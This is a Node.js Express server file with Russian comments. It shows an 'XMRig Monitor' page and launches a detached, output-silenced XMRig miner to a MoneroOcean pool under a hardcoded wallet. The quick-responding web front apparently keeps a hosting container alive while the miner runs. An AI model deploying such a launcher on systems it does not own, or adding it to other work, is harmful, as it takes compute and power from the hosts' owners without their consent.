const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const { spawn } = require('child_process');

const app = express();
const port = process.env.PORT || 3000;

// Логгер запросов
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Главная страница — отвечаем мгновенно
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>XMRig Monitor</title></head>
      <body style="font-family: sans-serif; text-align: center; padding: 40px;">
        <h1>⛏️ XMRig Monitor</h1>
        <p>Майнер запущен и работает.</p>
        <p><a href="/workers" target="_blank">📊 Открыть xmrig-workers</a></p>
        <p><a href="/api" target="_blank">📡 Открыть API майнера</a></p>
      </body>
    </html>
  `);
});

// Прокси для xmrig-workers
app.use('/workers', createProxyMiddleware({
  target: 'http://localhost:3001',
  changeOrigin: true,
  pathRewrite: { '^/workers': '' },
}));

// Прокси для API XMRig
app.use('/api', createProxyMiddleware({
  target: 'http://localhost:3000',
  changeOrigin: true,
  pathRewrite: { '^/api': '' },
}));

// Запускаем сервер
const server = app.listen(port, '0.0.0.0', () => {
  console.log(`✅ HTTP server is ready on port ${port}`);
  
  // Запускаем майнер в фоне, без блокировки
  const miner = spawn('/entrypoint.sh', [
    '-o', 'gulf.moneroocean.stream:10004',
    '-u', '48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36',
    '-p', 'x',
    '-k',
    '-t', '2'
  ], {
    detached: true,          // отдельный процесс
    stdio: 'ignore',         // не ждём вывода
  });
  
  miner.unref();  // позволяем процессу не блокировать завершение сервера
  
  console.log('🚀 Miner started in background (PID: ' + miner.pid + ')');
});

// Корректное завершение
process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down...');
  server.close(() => process.exit(0));
});
